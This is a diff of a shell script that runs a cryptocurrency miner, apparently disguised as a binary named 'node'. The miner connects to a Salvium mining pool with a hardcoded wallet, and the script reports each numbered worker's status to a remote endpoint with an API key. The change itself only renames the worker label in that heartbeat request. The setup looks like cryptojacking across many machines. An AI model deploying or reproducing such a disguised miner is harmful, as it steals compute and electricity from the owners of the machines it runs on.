@@ -38,5 +38,5 @@ echo "start ${WORKER_NUMBER}"
 
 # salvium
 START=$(./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u solo:SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=360000.net_${WORKER_NUMBER} > try.log & sleep 1140 )
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"net_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"zend_net_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
 echo "done"
